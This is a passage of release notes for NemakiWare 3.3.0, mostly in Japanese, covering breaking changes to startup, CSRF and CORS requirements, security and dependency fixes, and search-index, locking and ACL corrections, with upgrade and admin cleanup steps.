# NemakiWare Release Notes

User-facing changelog. For per-commit detail see
[`docs/history/development-log.md`](docs/history/development-log.md); for design
rationale see [`docs/design/`](docs/design/). [`CLAUDE.md`](CLAUDE.md) now holds
only repository gotchas.

---

# 3.3.0 (2026-08-17)

## 3.3.0 破壊的変更 — 起動要件とクライアント要件

### CouchDB 3.3 以上が必須になりました (**起動を止めます**)

3.3.0 は起動時に CouchDB のバージョンを確認し、**3.3 未満なら起動しません**。バージョンが
読み取れない場合も同様に拒否します (不明を「たぶん大丈夫」とは扱いません)。

これまではバージョンを読んで health 画面に出すだけだったため、古い CouchDB でも起動でき、
**後になって別の場所で別の症状として壊れて**いました。2.4 世代の環境は CouchDB 1.6 / 2.x の
ことが多いので、**NemakiWare を上げる前に CouchDB を上げてください**。

> 下限を 3.3 にしたのは「3.x と書いてあるから」ではありません。検索索引の整合を守る仕組み
> (ACL-epoch scanner) が「絶対に全件走査しない」ことを保証する根拠が CouchDB 3.3.x の挙動に
> 基づいており、3.0〜3.2 ではその検証をしていないためです。壊れると分かっているのではなく、
> **確かめていないので通さない**、という判断です。

### REST API に CSRF 対策ヘッダが必要になりました

**CMIS クライアントは影響を受けません。** AtomPub (`/atom/*`) は対象外、Browser Binding
(`/browser/*`) は非ブラウザクライアントを通す軽量ポリシーです。

影響を受けるのは **NemakiWare 独自の REST API** を直接叩いているクライアントです。

| 経路 | 変更 |
|---|---|
| `/core/rest/**` / `/core/api/v1/**` の POST / PUT / DELETE / **PATCH** | CSRF 検証。**Basic auth はバイパスしません** |
| `/core/api/v1/ingest-webhook/{id}` | **対象外** (HMAC 署名で検証するため)。`/subscribe` 側の管理操作は対象 |
| `/core/rest/repo/{repo}/archive/index` | `limit` 未指定時の応答が**全件から 100 件**になりました |

`X-Requested-With: XMLHttpRequest` を付けるか、Bearer / `AUTH_TOKEN` / `X-API-Key` で認証して
ください。Basic auth を除外しているのは、ブラウザが realm 単位で自動付与する ambient
credential だからです (付いていることが利用者の意図を示しません)。

アーカイブ一覧を全件前提で読んでいたクライアントは、`totalItems` を見て `skip` / `limit` で
ページングしてください。`limit` に 0 や負値を渡した場合も「未指定」として 100 件になります
(`ArchiveResource.effectiveLimit`)。

### CORS の既定が「許可しない」になりました

`api.cors.allowedOrigins` を**設定していない場合の意味が変わりました**。

| | 3.2 まで | 3.3.0 |
|---|---|---|
| 未設定 | `*` (**すべてのオリジンを許可**) | **CORS ヘッダを返さない** (ブラウザの same-origin policy が効く) |
| 明示設定 | そのオリジンのみ | 変更なし。`*` も明示すれば従来どおり |

同梱の React UI は `/core/ui/` と**同一オリジン**なので影響しません。
**影響するのは、別オリジンのブラウザアプリからこれらの API を叩いている場合だけ**です
(`/rest/*` `/api/*` `/odata/*` `/saml/*` `/services/*` `/mcp/*` — web.xml の corsFilter
マッピングが正)。その場合は自分のオリジンを設定してください。

```
api.cors.allowedOrigins=https://ecm.example.com,https://admin.example.com
```

**CMIS クライアント・スクリプト・MCP サーバなど非ブラウザのクライアントは影響を受けません** —
CORS はブラウザ側の仕組みです。未設定のときは起動ログにその旨が出ます。

---

## 3.3.0 で解決した既知の問題

### `npm audit` — **0 件になりました**

3.2 系では UI の依存に high が残っていました。3.3.0 で全て上げています。

| パッケージ | → |
|---|---|
| `js-yaml` | 4.3.0 → **4.3.1** (5.x は default export が無く `swagger-client` が壊れるため 4 系の修正版) |
| `dompurify` | 3.4.12 固定 → **3.4.13** |
| `react-router` / `react-router-dom` | 7.18.1 → **7.18.2** |
| `swagger-ui-react` | 5.31.x → **5.32.13** |
| `brace-expansion` | → **5.0.9** |

`npm audit --omit=dev` は **0 vulnerabilities**、UI ビルドと UI 単体テスト 191 件も通っています。

### `cxf-core` — **4.2.0 → 4.2.3**

SOAP バインディングの CXF を advisory の修正版 (4.2.2) より新しい **4.2.3** に上げました。

**併せて構造を直しています。** 4.2.0 はバージョン変数が無く **5 箇所にベタ書き**で、
安全に上げられない状態でした。`org.apache.cxf.version` プロパティに集約し、
**enforcer にファミリ規則を追加**しています (Spring / HttpComponents に次ぐ 3 本目)。
この規則を入れた時点で、OpenCMIS が CXF 4.1.3 を宣言していることが**その場で発覚**したので、
そちらも dependencyManagement で押さえました。WAR 内の CXF は 10 個すべて 4.2.3 です。

SOAP は実際に往復させて確認しています (MTOM の `getRepositories`、WSDL 6 本)。

---

## 3.3.0 追補 — 出荷物から開発用の残留物を取り除きました (2026-08-16)

### 無認証で応答していた診断エンドポイントを削除しました

`/core/rest/test`、`/core/rest/test/json`、`/core/rest/test/types` の 3 つが
**認証なしで 200 を返していました** (`/rest/test/*` が `web.xml` の security-constraint に
無かったため)。返していたのは固定文字列だけでデータ漏洩はありませんが、開発用の足場が
本番で公開されている状態でした。**クラスごと削除しました** — これらは 404 になります。

同じく参照されていなかった `MockSolrUtil` / `MockQueryProcessor` も WAR から除きました。

### `/rest/all/repositories` が CORS 設定を無視していた問題

このエンドポイントだけ `Access-Control-Allow-Origin: *` を直書きしており、
**`api.cors.allowedOrigins` を設定しても効きませんでした**。設定を反映する
`SimpleCorsFilter` が立てたヘッダを、サーブレットが上書きしていたためです。
直書きを削除し、CORS の決定箇所を 1 つに集約しました。

> 併せて 3.3.0 では**既定値そのものも変わっています** — 未設定は「許可しない」です。
> 詳細は冒頭の破壊的変更「CORS の既定が『許可しない』になりました」を見てください。
> この修正の意味は「設定がこのエンドポイントにも効くようになった」ことです。

### WAR の中身

Playwright の出力 (346KB) を含むテスト成果物 4 件が `/core/ui/` 配下で公開されていたので
除きました。併せて `ui/public/**` が Vite の出力と**二重に**入っていたのも除いています
(218 エントリ)。WAR は 210.4MB → 205.7MB になりました (バイト実測 205,686,621)。UI の動作に変化はありません。

### JAXB 実装が 2 セット同梱されていた問題

`jaxws-rt` が引き込む古い `com.sun.xml.bind` 4.0.2 と、明示的に固定している
`org.glassfish.jaxb` 4.0.9 が**同じクラスを両方持って**いました。どちらが読まれるかは
Tomcat のディレクトリ走査順に依存するため**デプロイごとに変わり得え**、4.0.9 への更新が
環境によっては効いていませんでした。古い方を除外し、**SOAP バインディングが実際に
往復することを確認**しています (MTOM の `getRepositories`、WSDL 6 本)。

---

## 3.3.0 追補 — QA 用の `testuser` が本番にも作られていた問題を修正しました (2026-08-16)

**症状**: 初期化パッチ `Patch_TestUserInitialization` に有効・無効の切り替えが無く、**すべての
デプロイのすべてのリポジトリ**に QA 用のアカウント `testuser` と グループ `testgroup` が
作られていました。

**認証はできません。** 保存されるパスワード `test` は BCrypt ハッシュではないため、照合が
`BCrypt.checkpw` の不明形式フォールバックに落ちて例外になり、必ず不一致になります
(`AuthenticationUtil.passwordMatchesWithUpgrade`)。**したがって既知の資格情報で入られる
問題ではありません。** 問題は「誰も頼んでいない QA アカウントが本番データに居ること」と、
**後から管理者が実パスワードを設定すれば有効なアカウントになる**ことです。

**修正**: `patch.testuser.enabled` (既定 **false**) を新設し、明示的に有効にしたときだけ
作るようにしました。QA 環境では `PATCH_TESTUSER_ENABLED=true` を渡してください
(`docker-compose-simple.yml` が読みます)。

**既存環境**: パッチ適用済みの記録はリポジトリごとに残るため、**既にある `testuser` /
`testgroup` は自動では消えません**。不要なら管理 UI か REST で削除してください。

```bash
curl -u admin:admin -X DELETE -H "X-Requested-With: XMLHttpRequest" \
  "http://HOST:8080/core/rest/repo/REPO/user/delete/testuser"
```

```bash
curl -u admin:admin -X DELETE -H "X-Requested-With: XMLHttpRequest" \
  "http://HOST:8080/core/rest/repo/REPO/group/delete/testgroup"
```

---

## 3.3.0 追補 — 公開イメージの既定でクラウドディレクトリ同期が有効だった問題を修正しました (2026-08-16)

**症状**: 公開 Docker イメージ (および `docker/` の compose で自前ビルドしたイメージ) の
既定設定でクラウドディレクトリ同期が有効になっており、**毎日 02:00 に同期ジョブが起動して
いました**。同期先として NemakiWare 開発元の Google Workspace ドメインと管理者メールアドレスが
既定値として埋め込まれていました。

**影響**: 3.1.0 〜 3.2.8 の公開イメージが対象です。

- 鍵ファイル (`/usr/local/tomcat/secrets/google-service-account.json`) を置いていない環境では
  毎日 ERROR ログが 1 本出るだけで、それ以外の影響はありません。
- **他用途で同じパスに Google のサービスアカウント鍵を置いていた環境**では、その鍵で
  開発元ドメイン宛の domain-wide delegation を要求していました。当該サービスアカウントは
  開発元ドメインで委任されていないため Google 側が `unauthorized_client` で拒否し、
  **テナントをまたぐデータの読み書きは発生しません**が、意図しない外部 API 呼び出しでした。
- 利用者の環境から開発元へデータが送られることはありません (同期は「読み取って
  NemakiWare に取り込む」方向のみ)。

**修正**: 出荷設定の既定を `cloud.directory.sync.enabled=false` / providers・domain・adminEmail
すべて空にしました。同期を使う場合は `-D` か環境変数、または `docker/secrets/*.env` で
自分の値を与えてください。

**併せて**: WAR 同梱のテンプレート側でキー名が 2 つ実装と食い違っており、設定しても読まれない
状態でした (`cloud.directory.sync.google.serviceAccountKeyPath` → 正しくは
`...serviceAccountKey`、`cloud.directory.sync.windowSize` → 正しくは
`cloud.directory.sync.window.size`)。テンプレートを実装に合わせました。

**確認方法**: 起動ログの
`Cloud directory sync scheduler initialized (activeCron=...)` を見てください。この行は
有効・無効にかかわらず出ます (`CloudDirectorySyncScheduler.java:58`)。**`activeCron=null` なら
起動していません。** cron 式が入っていれば有効です。

---

## 3.3.0 追補 — 同時書き込みでサーバが停止する不具合を修正しました (2026-08-14)

### 複数ユーザが同時に文書を登録するとサーバが応答しなくなる問題

**症状**: RAG (AI 検索) を有効にしたリポジトリに**複数のクライアントが同時に**文書を
登録すると、その時点から **CMIS API 全体が応答を返さなくなります**。CPU 使用率は
ほぼゼロのまま、読み取りも書き込みも返りません。**回復するにはサーバの再起動が必要**です。

**原因**: 検索サーバ (Solr) との通信に使うクライアントライブラリが既定で用意する
スレッドプールを、そのままの設定で使っていました。このプールは実質 4 スレッドしかなく、
かつ 1 回の通信が**送信側と受信側で 2 スレッドを同時に**必要とします。同時 4 件で
送信側が全スレッドを占めると受信側が永久に起動できず、そのまま解けません。

RAG 文書はベクトルデータを含むため必ずこの条件に該当します。通常の CMIS 索引でも
十分に大きなデータであれば同じ状態になります。

**修正**: 専用のスレッドプールを用意し、送信側と受信側が奪い合わないようにしました。
**設定変更は不要**で、アップグレードするだけで解消します。

実測 (同時 12 件の文書登録):

| | 修正前 | 修正後 |
|---|---|---|
| 完了した件数 | **0 件** (180 秒以上応答なし) | **12 件** |
| 所要時間 | (完了せず) | 2.2 秒 |

> **3.3.0 より前のバージョンをお使いの場合**: この不具合は RAG 機能と同時書き込みが
> 揃ったときに出ます。同時実行数を絞る運用で回避していた環境では、3.3.0 で
> その制限を外せます。

---

## 3.3.0 追補 — 書き込みが速くなりました (2026-08-12)

### 文書作成のスループットが約 5 倍になりました

内部の CouchDB view クエリが、**必要な 1 件を絞り込むために view 全体を取得して
アプリ側で突き合わせて**いました。返る答えは正しかったため不具合として見えず、
**コストだけ**が出ていました。しかもそのコストは答えの大きさではなく
**リポジトリ全体の大きさに比例**するので、**リポジトリが育つほど書き込みが遅く**なります。

とくに文書作成では、CMIS の名前重複チェックが親フォルダの子名一覧を引くたびに
リポジトリ全体分を転送していました。開発環境 (2,722 行) の実測:

| | 1 件あたり (16 並列) | スループット |
|---|---|---|
| 修正前 | 11.85 秒 | 約 1.2 件/秒 |
| 修正後 | 0.44 秒 | 約 6.5 件/秒 |

同じ経路を**ログイン**も通ります (`userItemsById`)。ただしログインには 1 時間有効の
ユーザキャッシュがあるため、この転送が起きるのは**キャッシュミスのとき**です
(当初「ログインのたび」と書いていましたが誤りでした)。ユーザ数の多い環境では、
その 1 回の転送が全ユーザ文書分になります。**設定変更や再索引は不要**で、
アップグレードするだけで解消します。

### 移動時の権限反映が、混雑中でもリクエストを止めなくなりました

フォルダを移動すると、その配下の検索インデックス上の権限を書き直します。この処理の
待ち行列が埋まっているとき、**移動リクエスト自身がその書き直しを最後まで実行**して
いました。大きなフォルダを移動すると、そのリクエストが長時間返らないことになります。

同じ状況を権限変更 (`applyACL`) 側では既に回避しており (待ち行列が埋まっていたら
再同期キューに預けて即座に返す)、移動側だけがその処理を通っていませんでした。移動側も
同じ扱いに揃えました。**書き直しの仕事は失われません** — 再同期キューが引き受けます。

混雑していない通常時の動作は変わりません。

> **この変更が対象にしているのは、待ち行列に投入した後の索引書き換えだけです。**
> その手前で走るキャッシュ退避 (継承サブツリー全体の走査) は、今もリクエストスレッドで
> 同期実行されます。したがって**非常に大きなフォルダの移動は依然として時間がかかります**。

### インスタンスが残っているタイプは削除できなくなりました (**挙動変更**)

CMIS では、あるタイプのオブジェクトがまだ存在する間、そのタイプ定義の削除は拒否される
べきです。**これまでは成功していました** — チェック自体が未実装だったためで、削除すると
「型定義の無いオブジェクト」が残る状態になっていました。

これからは **409 (constraint)** で拒否されます。メッセージにタイプ名と理由が入ります。

- **影響**: これまで通っていた `deleteType` が失敗するようになります。タイプを削除する
  前に、そのタイプのオブジェクトをすべて削除してください。
- 子タイプを持つタイプの削除は従来どおり拒否されます (こちらは以前から動作していました)。
- **この検査が入るのは CMIS バインディング (AtomPub / Browser / Web Services) の
  `deleteType` です。** 管理画面が使う NemakiWare 独自の REST 削除
  (`DELETE /core/rest/repo/{repo}/type/delete/{typeId}`) は従来どおり削除できます。
  この API は元々「CMIS 非準拠。既存文書は基底型の挙動にフォールバックする」という警告を
  応答に含んでおり、意図的な管理用の抜け道です。**管理画面から型を消す場合は、
  インスタンスが残っていないかをご自身で確認してください。**
- **secondary type も対象です** (2026-08-13 追加)。当初は主タイプ
  (`cmis:objectTypeId`) しか見ておらず、文書に適用中の secondary type が削除できて
  いましたが、`secondaryIds` も確認するようにしました。

### 全再索引が、索引を消したまま「完了」と報告することがなくなりました (**重要**)

全再索引は **索引を消してから** リポジトリを走査します。その走査が中身を見つけられない
状態 (CouchDB の view が再構築中など) だと、**索引を空にしたうえで「完了・エラー 0 件」と
報告**していました。データそのものは無事ですが、**検索だけが全滅し、その事実が
どこにも出ない**状態です。

再索引の前に「今の索引が持っている件数」と「走査で見つけた件数」を突き合わせ、
**大きく食い違うときは索引を消さずに中止**するようにしました。中止すると状態は
`error` になり、メッセージに両方の件数が入ります。

> 本当にリポジトリを大幅に削除した後で再索引したい場合は、
> `POST /api/v1/cmis/repositories/{repo}/search-engine/clear` で明示的に索引を消してから
> 再索引してください。

**v3.3.0 は全再索引が必須**なので、アップグレード時にこの保護が効きます。

### 起動時パッチが、CouchDB の view が答えられない状態では適用されなくなりました (**重要**)

パッチの多くは「これは既に在るか？」を CouchDB の view で確かめてから作ります。**view が
再構築中だとエラーにならずに「0 件」と答える**ため、既に在るものを「無い」と判定して
**二重に作って**しまいます。実際に `.system` フォルダが 2 つできる事象が起きました
(CMIS のパス解決が壊れます)。

v3.3.0 のアップグレードでは view の再構築が起きるため、この窓が現実に開きます。
**データベースに文書があるのに中核 view が 1 件も返さない場合は、パッチを適用せず
次回起動に回す**ようにしました。ログに理由が出ます。新規リポジトリは対象外です。

### 削除済み文書が検索に残ったとき、再索引なしで消せるようになりました

索引からの削除は非同期で、失敗するとその場で再試行しますが、**プロセスが落ちると
その再試行ごと消えます**。結果として、削除済みの文書が検索に残ることがあります。

- 恒久的に失敗した場合、**ログに対処方法まで出す**ようにしました
- `POST /api/v1/cmis/repositories/{repo}/search-engine/purge-orphans` で
  **CouchDB に存在しない索引エントリだけを削除**できます。従来は 10 時間級の全再索引しか
  手がありませんでした
- 一覧は `GET .../search-engine/health/details` の `orphanedInSolr` で確認できます

> このコマンドは、索引とリポジトリの食い違いが大きすぎる場合 (= リポジトリが読めていない
> 疑いがある場合) は**何も削除せずに拒否**します。

### 型の削除・名前の一意性が、データベース障害中に素通りしなくなりました

「そのタイプのインスタンスが在るか」「同じ名前の子が既に在るか」の確認は CouchDB の
view を引きます。**引けなかったときに「無い」と答えていた**ため、障害中は
インスタンスが残っている型が削除でき、名前の重複も作れました。

いずれも、view が答えられないときは**確認できない旨のエラー**を返すようにしました。
view が再構築中で「0 件」と答える場合も、別経路で裏を取ります。

### 全再索引が、全文書を二度索引付けするのをやめました

バッチ書き込みの直後に検索クエリで確認していたため、**まだコミットされていない文書が
「消えた」と判定され、ほぼ全件が 1 件ずつ再索引**されていました。確認方法をリアルタイム
取得に変えました。

実測 (5,615 オブジェクト): `silentDropCount` と `reindexedCount` が **5,614 → 0**。
つまり全文書が二度索引付けされていたのが一度になりました。**あわせて、進捗 API が
「5,614 件が黙って落ちた」と報告していたのも解消します** — 実際には落ちておらず、
この数字自体が誤りでした。

> **所要時間は変わりません。** 同じ 5,615 オブジェクトで前後を測ったところ 77 秒 / 84 秒で、
> 二重の索引付けを消しても速くはなりませんでした。大規模環境で再索引が遅くなる問題
> (10 万文書で 10 時間級) は**別の原因**で、まだ特定できていません。

### 権限伝播の内部キャッシュを監視できるようになりました

`GET /core/api/v1/admin/search-index/metrics` に、権限伝播の走査が使う祖先キャッシュの
カウンタを追加しました。**`traversalMemoEvictions` を見てください** — 0 のままなら
上限は余裕です。増え続ける場合は、1 回の権限変更が触るフォルダ数が上限 (既定 2,048) を
超えており、CouchDB への読み取りが増えています。

開発環境の実測では、深さ 12・フォルダ 84 個の木で実際に要ったのは **86 エントリ**
(上限の 4.2%)、eviction は 0 件でした。

### CMIS の拒否が 500 ではなく正しい状態コードで返るようになりました

`deleteType` は、拒否を含むあらゆる例外を「サーバ内部エラー」として包み直していたため、
**意図した拒否がすべて 500** で返っていました。CMIS の例外はそのまま返すようにしたので、
上記の制約違反は 409、引数不正は 400 と、本来の状態コードになります。

> 1 段内側では、制約違反と引数不正**以外**の失敗が今も
> `CmisObjectNotFoundException` (404) に包まれます。つまり「削除に失敗した」が
> 「そもそも存在しない」として返る場合があります。これは今回の変更前からの挙動で、
> 別途対応します。

---

## 3.3.0 追補 — 権限伝播とロック順の是正 (2026-08-11)

### ロック競合が 500 ではなく 503 で返るようになりました (**クライアント影響あり**)

オブジェクトロックの取得に**上限**が入りました。これまで、まれな条件下でロックの
待ち合わせが循環すると**リポジトリ全体が再起動まで応答を止める**ことがありました
(実際に発生。詳細は [`docs/design/v3.3-release-blockers.md`](docs/design/v3.3-release-blockers.md)
の A6 節)。上限により、この故障は「リポジトリ停止」から「**そのリクエスト 1 本が
失敗する**」に格下げされます。

- 返るのは **HTTP 503** (`CmisServiceUnavailableException`)。**再試行して構いません**。
  500 (恒久的な障害) と区別してください。
- AtomPub / Browser binding / `/api/v1` のいずれでも 503 になります。ただし
  `/api/v1` の一部 (原因例外を伝播しない 29 箇所) では 500 のままです。
- 通常運用では発生しません。全テストスイート 1 周でも発火ゼロで、
  発火するのは 300 秒待っても取れない極端な輻輳時のみです。
- 移動やチェックイン等で**別リクエストと衝突した読み取り**は、409
  (`CmisUpdateConflictException`) を返すことがあります。こちらも再試行対象です。

### 管理エンドポイントを 3 本追加

いずれも管理者のみ。読み取り専用です。

| パス | 用途 |
|---|---|
| `GET /core/api/v1/admin/search-index/metrics` | 伝播の各種カウンタ (要求スレッドへの流出、耐久キューへの委譲、pending gate、グループ解決の打ち切り 等) |
| `GET /core/api/v1/admin/search-index/propagation` | 実行中の伝播と、信頼できる場合のみの ETA |
| `GET /core/api/v1/admin/search-index/lock-order` | 危険なロック順の検出結果 (upgrade / inversion) |

「上位フォルダの権限変更にどれくらいかかるか」「今それで詰まっているのか」を
管理者が判断するための情報です。

### 権限剥奪の索引削除に専用レーン

RAG ブロックの削除 (剥奪に伴うもの) が、大規模な権限変更の再索引バックログの後ろで
待たされないよう、専用のポーリングレーンに分離しました。利用者から見た挙動の変化は
ありません (剥奪後に検索から消えるまでの時間が短くなります)。

### 既知の制限: ACL の `objectonly` 伝播は未対応です

`applyACL` の `aclPropagation` に **`objectonly` を指定しても、`propagate` として扱われます**
(エラーにはなりません)。この制限は Alfresco と同じ位置づけです。

理由は実効 ACL の計算方法です。NemakiWare は子孫に実効 ACL を保存せず、**読み取りのたびに
祖先をたどって計算**します。したがって上位フォルダの ACL を変更すると、`objectonly` を
指定したかどうかに関わらず子孫の実効 ACL は変わります。「このオブジェクトだけ」を実現するには
継承を切って (`breakInheritance`) ください。

capability の宣言は `propagate` のままです (CMIS 1.1 §2.1.12.3 は propagate が objectonly の
サポートを含むと読めるため、値の受理自体は非適合ではありません)。

### 継承ブレーク時に、送った ACL が実際に適用されるようになりました (**挙動変更**)

これまで `breakInheritance=true` を伴う `setACL` は、**送られた ACE リストを読まずに**
現在の実効 ACL をそのままローカル化していました。「継承を切り、同時にこの人を外す」
という 1 回の呼び出しが、**成功を返したうえで剥奪だけ行われない**状態でした。

- 継承ブレーク時は、要求された ACE を `direct` フラグに関係なく**すべて**保存します。
  継承を切った後は継承元が無いため、フラグは*出自*を表すもので*行き先*ではありません。
- 画面の「継承を解除」ボタンの動作は変わりません (読み込んだ実効 ACL をそのまま
  送り返す作りなので、継承分もローカル ACE として引き継がれます)。
- **空の ACE リスト + ブレークは「空の ACL」として扱います** (従来は「現状維持」)。
  CMIS の add/remove 版は結果リストを計算して渡すため、最後の ACE の削除がこの形で
  届きえます。**「継承を切りつつ現状を維持する」という指定はありません** — 継承ブレークは
  ACL の extension で伝えるので、ACL を省略すると継承ブレーク自体が起きません。

### RAG 検索の `folderId` がフォルダを絞るようになりました (**不具合修正**)

`GET /api/v1/cmis/repositories/{repo}/rag/search` の `folderId` は、**指定しても
絞り込まれていません**でした。指定したフォルダの外の文書が返り、中の文書が落ちる
ことがあります。**権限の問題ではなく** (返るのは元から読める文書だけです)、
スコープ指定が効いていなかったという不具合です。`folderId` を信頼して結果を
絞っていた連携がある場合は、返る集合が変わります。

`folderId` と `propertyBoost` / `contentBoost` / `minScore` を**併用できるように**
なりました。これまで `folderId` を指定すると残り 3 つは無視され、サーバ設定値で
検索されていました (エラーにはならず、要求と違う検索結果が 200 で返っていました)。

### 複数レプリカ構成での権限剥奪の反映時間 (**運用情報**)

レプリカを複数台で運用する場合、**権限を変更したレプリカ以外**に反映されるまでの時間は
経路によって桁が違います。開発スタックで 2 レプリカ (同一 CouchDB / Solr) を立てて実測しました。

| 操作 | 変更したレプリカ | **別のレプリカ** |
|---|---|---|
| ACE の削除 (フォルダの権限を外す) | 0.1〜0.3 秒 | **0.3〜1.5 秒** |
| グループからユーザを外す | 0.1 秒 | **5〜10 秒** |

グループ経由だけ遅いのは、principal 世代のキャッシュが**ポーリング (既定 5 秒)** でしか
他レプリカに伝わらないためです。書き込み側の publish と読み取り側の検知でポーリングを
2 回跨ぐので、**正常時の目安は 5〜10 秒**です。単一レプリカ構成では該当しません。

> **これは上限 (SLA) ではありません。** ポーリングは `scheduleWithFixedDelay` なので
> 各回の実行時間が間隔に上乗せされます。さらに、世代の publish が失敗しても警告ログを
> 残して次の周回に回されるだけで、CouchDB が落ちている・ポーラが停止している・
> publish が競合し続ける、といった状況では **反映は無期限に遅れえます**。
> 剥奪の反映を時間で保証したい要件がある場合、この仕組みだけに依存しないでください。

短縮したい場合はポーリング間隔を縮められますが、CouchDB への読み出しが増えます。

### アップグレード時に CouchDB の view が再構築されます (**メンテナンス窓を推奨**)

入れ子グループの逆引き view (`joinedDirectGroupsByGroupId`) が、辺 1 本につき**同じ行を
20 回**書いていました。1 回に修正しています (開発環境の実測: view の行数 960 → 48、
design document の index ファイル 227.8 MB → 183.1 MB)。

**この修正の適用時、CouchDB は `_design/_repo` の全 view を再構築します。** 大規模な
リポジトリでは時間がかかり、その間 view を使う操作 (一覧・検索・パッチ履歴の照会など) が
待たされます。**メンテナンス窓での適用を推奨**し、適用後に view を 1 本叩いて再構築を
完了させてから通常運用に戻してください。

> 起動時のログに `Error getting patch history ... _repo/patch - timeout` が出ることが
> あります。パッチ機構の履歴 view が同じ design document に同居しているため、自分が
> 起こした再構築に当たったものです。パッチは冪等なので再起動での再適用は安全です。

### 添付の読み出しで CouchDB 接続が漏れなくなりました

存在確認・長さ・MIME type だけが必要な箇所が添付本体を丸ごとダウンロードし、
その接続を閉じずに捨てていました。**全再索引で特に顕著**で、開発スタックの実測では
2,510 文書の再索引中に ESTABLISHED 接続が 3 → 1,289 まで増え、完了後も約 90 秒
張り付いていました。メタデータ専用の経路に切り替え、本体を開くのは実際に読む
ときだけにしています。

> **追記 (2026-08-13): 97,693 オブジェクトまで実測しました。** 再索引中のピークは 5 で、
> アイドル時 (3) とほとんど変わりません。文書数を最初の実測点の 17 倍にしても
> ピークは 3 → 5 で、接続漏れの警告は 0 件でした。
> **20 万以上はまだ未実測**なので、その規模で運用される場合は再索引時の接続数監視を
> お願いします。
>
> **別件の注意: 10 万規模では全再索引そのものに 10 時間級かかります。** 処理レートが
> 規模とともに低下します (2.6 万件で 10.3 件/秒 → 9.8 万件で 2.6 件/秒)。接続漏れとは
> 別の課題ですが、アップグレード時の再索引を計画される際は所要時間にご注意ください。

---

## 3.3.0 追補 — OpenCMIS 2.0.0-RC2 採用 (2026-08-07)

OpenCMIS を自己ビルドの `2.0.0-RC2-nemakiware` に更新しました。Java 21 baseline、
クエリスタックの ANTLR4 化、HTTP クライアントの Apache HttpClient 5 化を含みます。
CMIS の外部仕様に変更はなく、AtomPub / Browser / Web Services の各バインディングは
従来どおりです (CMIS TCK 38 テスト green)。

### ユーザ / グループが `/.system/users` に出ないことがあった

一部の生成経路 (MCP サービスアカウントと初期化時のテストユーザ) が、ユーザ項目を
親フォルダに紐付けずに作成していました。アカウントは存在して認証もできる一方、
`/.system/users` の一覧には現れず、管理 UI からも見えません。修正済みです。

**既存環境で見えないユーザ / グループがある場合**、その項目は親フォルダを持たない
状態で保存されています。新規作成分は自動的に正しく紐付きますが、既存分は
CouchDB 上で `parentId` を `/.system/users` (グループは `/.system/groups`) の
オブジェクト ID に設定してください。

アップグレード時のその他の注意はありません。運用者の操作も不要です。

---

## 3.3.0 追補 — Jackson 3 移行と Spring 7 閉鎖 (2026-08-06)

### Jackson 2 → 3 (`tools.jackson`)

自コードのシリアライズは Jackson 3.2.1 になりました。Jackson 2 は Cloudant SDK・SolrJ・
CXF・Jersey の JSON provider が必要とするため WAR 内に残りますが、**推移依存としてのみ**です
(名前空間が異なるため共存できます。annotation は 2 系のものが両者で共有されます)。

**CouchDB に永続される文書の内容と符号化は変わりません。** 移行前に採取した golden で、
プロパティ集合・値・符号化 (数値の文字列化、日付表現、null の扱い)・読み書き往復の形状が
同一であることを確認しています。

**REST API の応答で 1 点だけ変わります。** Spring MVC が扱う `/core/api/...` のうち
POJO を返すエンドポイントは、プロパティの並びが**アルファベット順**になります
(値・型・日付形式は不変)。JSON オブジェクトのキー順に意味はなく、従来の並びは
JVM のクラスロード順に依存していて起動ごとに変わりうるものでした (実測で確認)。
今回の変更で並びは決定的になります。キー順に依存するクライアントがある場合のみ注意してください。
Jersey が扱う `/core/rest/...` と `/core/api/v1/cmis/...` は Jackson 2 のままで、影響ありません。

### Spring 7 閉鎖

- 全 `org.springframework` モジュールが単一版であることをビルドで強制するようになりました
  (以前 spring-tx だけが古い版で混入した事故があり、目視でしか気づけませんでした)。
- 実体のない log4j 1.x 用フラグ (`-Dlog4j.configuration`) を Dockerfile と compose から削除しました。
  ログは従来どおり Logback です。動作に変化はありません。

---

## 3.3.0 追補 — 起動ごとの型定義リーク修正とアーカイブ一覧の有界化 (2026-08-06)

### 起動ごとに propertyDefinitionDetail が漏れていた

システム CMIS プロパティの初期化が存在確認なしに毎起動 detail 文書を作成しており、
起動を重ねた環境では リポジトリあたり数千件の孤児文書が蓄積、型一覧 API
(`/rest/repo/{repo}/type/list`) が数秒単位まで劣化していました。初期化は冪等になり、
不足分だけを一度作成します (リポジトリごとに view 読取 2 回)。蓄積済みの環境は
アップグレード後もそのまま動きますが、孤児の掃除は型一覧の応答時間を回復させます。

注意: これらの standalone detail は稼働中の型キャッシュ再構築が参照します。
手動で削除した場合は core の再起動 (初期化が不足分を再作成) まで型プロパティ検査が
不完全になることがあります。

### `/rest/repo/{repo}/archive/index` の既定応答が有界に

limit 未指定の呼び出しは従来**全件**を返していました (蓄積環境で数十 MB・数十秒に達し、
実際に QA を停止させた実測あり)。既定は新しい順 100 件になり、`totalItems` で総数を
判定できます。明示的な limit はこれまでどおり尊重されます。全件が必要なクライアントは
skip/limit でページングしてください。管理 UI は元からページングしており影響ありません。

---

## 3.3.0 — Breaking-major dependency uplift + native ARM64 stack + OData repair (2026-07-22)

### Persistent-format addition (content documents + Solr schema)

Content documents gain a `content_incarnation` field, and the Solr schema gains
`content_incarnation` (string) and `content_generation` (long). Together they fence the CONTENT axis:
`content_generation` is the Content's own `_rev` generation, and because a restore reuses the id but
restarts `_rev` at 1, generations are only compared WITHIN one incarnation — a different one means
"new lifetime, write authoritatively" instead of "skip as older", which is what stops a restored
document being refused for ever.

New content is stamped in the same CouchDB commit that creates it; existing content is backfilled by
`Patch_ContentIncarnationBackfill` at startup, or lazily by the first authoritative write, whichever
wins the `_rev` CAS. No manual step is required. An archive restore always mints a FRESH incarnation
and never reuses the archived one.

The content fence reads `content_generation` only. (The ACL axis is fenced by
`effective_acl_epoch` — see the ACL-epoch section below.)

**Reusing an existing SOLR_HOME? Add the three fields by hand.** The schema shipped in the Solr image
seeds a FRESH `SOLR_HOME` only; an existing one keeps its own `schema.xml` on the data volume, and
the core uses `ClassicIndexSchemaFactory`, so the Schema API refuses to add them
(`schema is not editable`). Without them EVERY document write fails with
`400 unknown field 'content_incarnation'` — the CMIS operation still succeeds, but the index silently
stops being updated, so queries return stale or missing results while `ERROR Solr indexing
permanently failed for document …` accumulates in the log. Edit
`{SOLR_HOME}/nemaki/conf/schema.xml` to add

```xml
<field name="effective_acl_epoch" type="long" indexed="true" stored="true" required="false" multiValued="false" />
<field name="content_incarnation" type="string" indexed="true" stored="true" required="false" multiValued="false" />
